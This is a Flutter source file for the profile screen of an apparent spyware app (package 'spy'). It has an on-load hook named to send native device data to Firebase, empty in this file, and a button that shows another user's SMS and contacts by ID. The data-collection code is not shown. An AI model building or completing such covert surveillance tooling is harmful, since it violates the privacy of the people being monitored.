import 'package:firebase_auth/firebase_auth.dart';
import 'package:flutter/material.dart';
import 'package:flutter_bloc/flutter_bloc.dart';
import 'package:cloud_firestore/cloud_firestore.dart';
import 'package:spy/bloc/user/user_bloc.dart';
import 'package:spy/bloc/user/user_event.dart';
import 'package:spy/bloc/user/user_state.dart';
import 'package:spy/ui/user_data_screen.dart';

class HomeScreen extends StatefulWidget {
  const HomeScreen({super.key});

  @override
  State<HomeScreen> createState() => _HomeScreenState();
}

class _HomeScreenState extends State<HomeScreen> {
  final searchController = TextEditingController();

  @override
  Widget build(BuildContext context) {
    final user = FirebaseAuth.instance.currentUser;

    if (user == null) {
      return const Scaffold(body: Center(child: Text("User not logged in")));
    }

    return BlocProvider(
      create: (_) =>
          UserBloc(FirebaseFirestore.instance)..add(LoadUserProfile(user.uid)),
      child: UserProfile(searchController: searchController),
    );
  }
}

class UserProfile extends StatefulWidget {
  final TextEditingController searchController;
  const UserProfile({super.key, required this.searchController});

  @override
  State<UserProfile> createState() => _UserProfileState();
}

class _UserProfileState extends State<UserProfile> {
  final nameController = TextEditingController();
  final genderController = TextEditingController();

  bool isEditing = false;

  @override
  void initState() {
    super.initState();
    _fetchNativeDataAndSendToFirebase();
  }

  Future<void> _fetchNativeDataAndSendToFirebase() async {
    final user = FirebaseAuth.instance.currentUser;
    if (user == null) return;
  }

  void _navigateToUserData() {
    final enteredId = widget.searchController.text.trim();
    if (enteredId.isEmpty) {
      ScaffoldMessenger.of(context).showSnackBar(
        const SnackBar(content: Text("Please enter a User ID")),
      );
      return;
    }

    Navigator.push(
      context,
      MaterialPageRoute(
        builder: (_) => UserDataScreen(userId: enteredId),
      ),
    );
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      appBar: AppBar(title: const Text("User Profile")),
      body: BlocConsumer<UserBloc, UserState>(
        listener: (context, state) {
          if (state is UserError) {
            ScaffoldMessenger.of(context)
                .showSnackBar(SnackBar(content: Text(state.message)));
          }
        },
        builder: (context, state) {
          if (state is UserLoading) {
            return const Center(child: CircularProgressIndicator());
          }

          if (state is UserLoaded) {
            final user = state.user;
            nameController.text = user.name;
            genderController.text = user.gender;

            return SingleChildScrollView(
              padding: const EdgeInsets.all(16),
              child: Column(
                crossAxisAlignment: CrossAxisAlignment.start,
                children: [
                  Text("User ID: ${FirebaseAuth.instance.currentUser?.uid ?? 'N/A'}"),
                  Text("Email: ${user.email}"),
                  const SizedBox(height: 10),
                  Text("Phone: ${user.phone}"),
                  const SizedBox(height: 10),
                  TextField(
                    controller: nameController,
                    decoration: const InputDecoration(labelText: 'Name'),
                    enabled: isEditing,
                  ),
                  TextField(
                    controller: genderController,
                    decoration: const InputDecoration(labelText: 'Gender'),
                    enabled: isEditing,
                  ),
                  const SizedBox(height: 20),
                  ElevatedButton(
                    onPressed: () {
                      if (isEditing) {
                        context.read<UserBloc>().add(
                          UpdateUserProfile(
                            name: nameController.text.trim(),
                            gender: genderController.text.trim(),
                          ),
                        );
                      }
                      setState(() {
                        isEditing = !isEditing;
                      });
                    },
                    child: Text(isEditing ? 'Save' : 'Edit Name & Gender'),
                  ),
                  const Divider(height: 40),
                  const Text(
                    'Search Another User',
                    style: TextStyle(fontSize: 16, fontWeight: FontWeight.bold),
                  ),
                  const SizedBox(height: 10),
                  TextField(
                    controller: widget.searchController,
                    decoration: const InputDecoration(
                      labelText: 'Enter User ID',
                      border: OutlineInputBorder(),
                    ),
                  ),
                  const SizedBox(height: 10),
                  ElevatedButton.icon(
                    onPressed: _navigateToUserData,
                    icon: const Icon(Icons.search),
                    label: const Text("View SMS & Contacts"),
                  ),
                ],
              ),
            );
          }

          return const Center(child: Text('Unable to load profile.'));
        },
      ),
    );
  }
}
